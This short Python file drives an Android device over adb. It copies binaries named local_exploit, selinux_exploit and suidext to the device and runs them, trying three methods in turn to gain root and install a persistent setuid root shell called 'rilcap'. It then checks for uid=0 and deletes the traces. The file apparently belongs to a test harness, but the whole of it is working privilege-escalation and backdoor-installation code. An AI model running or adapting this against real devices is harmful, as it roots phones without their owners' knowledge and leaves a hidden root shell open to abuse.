__author__ = 'mlosito'
import adb

def check_su_permissions(adb, devSerialnumber):
        checkSU = adb.executeSU('id', True, devSerialnumber)
        print checkSU
        if checkSU.startswith('uid=0'):
            return True
        else:
            return False


def install_rilcap_shell(devSerialnumber):

        #trying method 1
        #installs (to tmp) necessary files for root (rilcap shell installing)
        adb.copy_tmp_file("avassets/android_exploit/suidext", devSerialnumber)
        #installs RILCAP /data/local/tmp/in/local_exploit "/data/local/tmp/in/suidext rt"
        adb.call('shell /system/bin/su -c "/data/local/tmp/in/suidext rt"', devSerialnumber)
        #remove temp files
        adb.remove_temp_file('suidext')
        #checks if root
        if (check_su_permissions(adb, devSerialnumber)):
            return True

        #trying method 2
        #installs (to tmp) necessary files for root (rilcap shell installing)
        adb.copy_tmp_file("avassets/android_exploit/local_exploit", devSerialnumber)
        adb.copy_tmp_file("avassets/android_exploit/suidext", devSerialnumber)
        #installs RILCAP /data/local/tmp/in/local_exploit "/data/local/tmp/in/suidext rt"
        adb.call('shell /data/local/tmp/in/local_exploit "/data/local/tmp/in/suidext rt"', devSerialnumber)
        #remove temp files
        adb.remove_temp_file('local_exploit')
        adb.remove_temp_file('suidext')

        #checks if root
        if (check_su_permissions(adb, devSerialnumber)):
            return True

        #trying method 3
        #installs SUIDEXT shell
        #installs (to tmp) necessary files for root (rilcap shell installing)
        adb.copy_tmp_file("avassets/android_exploit/selinux_exploit", devSerialnumber)
        adb.copy_tmp_file("avassets/android_exploit/selinux_suidext", devSerialnumber)
        #installs RILCAP
        adb.call('shell /data/local/tmp/in/selinux_exploit "selinux_suidext rt"', devSerialnumber)
        #cleanup
        adb.remove_temp_file('selinux_exploit')
        adb.remove_temp_file('selinux_suidext')

        if (check_su_permissions(adb, devSerialnumber)):
            return True
        else:
            assert False


def uninstall_rilcap_shell(devSerialnumber):
    #uninstalls RILCAP - adb shell rilcap ru
    adb.call('shell rilcap ru', devSerialnumber)

